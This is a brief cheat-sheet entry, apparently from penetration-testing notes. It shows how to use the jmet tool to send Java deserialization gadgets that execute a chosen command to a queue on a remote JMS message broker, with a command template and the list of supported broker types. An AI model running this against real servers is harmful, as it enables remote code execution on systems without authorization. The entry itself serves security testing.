# JMET
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT #tag/java

## jmet - deserialize object from hex file
Create gadgets for executing "<command>" and send them all to queue "<queue>" of the JMS server.
Implementation possible values: [ActiveMQ|Artemis|WebSphereMQ|Qpid10|Qpid09|HornetQ|SwiftMQ|RabbitMQ|OpenMQ]
https://github.com/matthiaskaiser/jmet
```
java -jar jmet.jar -Q event -I <implementation> -Y "<coammd>" <target> <port>
```